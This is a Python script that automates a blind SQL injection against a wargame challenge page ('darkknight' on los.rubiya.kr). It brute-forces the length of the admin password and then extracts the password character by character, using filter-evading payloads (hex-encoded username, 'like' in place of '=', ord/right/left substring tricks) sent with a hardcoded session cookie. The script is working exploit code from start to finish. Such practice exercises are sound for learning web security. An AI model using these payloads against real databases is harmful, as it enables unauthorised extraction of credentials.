import requests
from bs4 import BeautifulSoup as bs
import time


URL = "https://los.rubiya.kr/chall/darkknight_5cfbc71e68e09f1b039a8204d1a81456.php"
COOKIE = {"PHPSESSID": "fd4ccak7dio546imsg3utup4n7"}
USER_AGENT = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0"}


def crackingPasswordLength():
	session = requests.Session()
	for i in range(1,31):
		res = session.get(url = '{}?no="" or id like 0x61646d696e and length(pw) like {} %23'.format(URL, i),
							cookies = COOKIE, 
							headers = USER_AGENT
						).text

		res = bs(res, 'lxml').find_all('h2')
		if res:
			print("[+] pw column length Value : {}".format(i))
			print()
			return i


def main():
	credentials = []
	passwordLength = crackingPasswordLength()
	session = requests.Session()
	for i in range(1, passwordLength + 1):
		for v in range(33, 128):
			res = session.get(url = '{}?no="" or id like 0x61646d696e and ord(right(left(pw,{}),1)) like {} %23'.format(URL, i, v),
				cookies = COOKIE, 
				headers = USER_AGENT
			).text
			res = bs(res, 'lxml').find_all('h2')
			if res:
				print("[+] {}th Value is : {}".format(i, chr(v)))
				credentials.append(chr(v))
				break
	print()
	print("[+] Task Done! Final Password : {}".format("".join(credentials)))


if __name__ == '__main__':
	start_time = time.perf_counter()
	main()
	end_time = time.perf_counter()
	
	print("[*] Total Time : {}".format(end_time - start_time))
